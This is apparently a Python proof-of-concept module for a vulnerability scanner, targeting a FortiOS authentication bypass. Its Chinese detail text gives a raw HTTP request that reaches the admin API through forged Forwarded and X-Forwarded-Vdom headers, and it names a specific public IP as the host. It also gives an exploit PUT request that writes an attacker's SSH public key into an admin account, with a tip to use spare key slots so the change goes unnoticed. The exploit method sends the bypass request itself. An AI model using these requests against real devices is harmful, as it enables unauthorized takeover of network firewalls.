from PocUtils import PocType, Severity
from PocUtils.Http import Http
from urllib.parse import urljoin, urlparse
import socket
import ssl


class Poc:
    def __init__(self):
        self.poc_type = PocType.http
        self.target = ""
        self.severity = Severity.high
        self.detail = """Fortinet系列产品存在认证绕过漏洞，poc如下：

```http
GET /api/v2/cmdb/system/admin HTTP/2
Host: 36.94.52.199
User-Agent: Node.js
Accept-Encoding: gzip, deflate
Accept: */*
Forwarded: by=""for=""
X-Forwarded-Vdom: abcd


```

如果返回了用户名和系统信息就说明存在漏洞，返回401则说明不存在漏洞

exp如下，可以尝试把ssh-public-key1换成ssh-public-key2或ssh-public-key3，防止影响业务

```http
PUT /api/v2/cmdb/system/admin/用户名 HTTP/1.1
Host: 192.168.27.99
User-Agent: Report Runner
Accept-Encoding: gzip, deflate
Connection:close
Forwarded: for=127.0.0.1; by=127.0.0.1;
Content-Type:application/json
Content-Length: 427

{
"ssh-public-key1": "\\"ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAsEIb3qw+aveFIyn2bV+ZSsrgAoVKJN5TEjTtVEBq8i/C050DSFxXvQiEIm73Kc9H+6oHDU5A1ziEfMu12hSK7sJ6ThDd6Qvn9DjOtWKRUVDLzIHZGQq7v3YEg6H9MXkvx3NrcSOoIuTUEhCKo/ev56qx+BC6rsy28VAO9Bh4qzUWdlafQrpUHCbC4fGDdhPl7pEVPuCrauzP+FowrWD6CWnulTv3LkS7frlXj8SOpWOs+fZFq0FRUKZWnB2oAwl4/i9WM76D9PVXefbx4OMEc/rExTSLj4tJhORCpLRfd0IAJATKTydgUrBHefO/I0HjnjMzyIcj/VmMwEvQeWTMIw== rsa 2048-112522\\""
}
```

https://blog.csdn.net/qq_32261191/article/details/127614713"""
        self.name = "FortiOS认证绕过漏洞"

    def check(self):
        client = Http()
        client.url = urljoin(self.target, "/")
        resp = client.get()
        if "<title>Forti" in resp.text:
            return True
        else:
            return False

    def exploit(self):
        client = Http()
        client.url = urljoin(self.target, "/api/v2/cmdb/system/admin")
        client.headers["User-Agent"] = 'Node.js'
        client.headers["Forwarded"] = 'by=for='
        client.headers["X-Forwarded-Vdom"] = 'abcd'
        resp = client.get()
        if resp.status_code != 401:
            return True
        else:
            return False
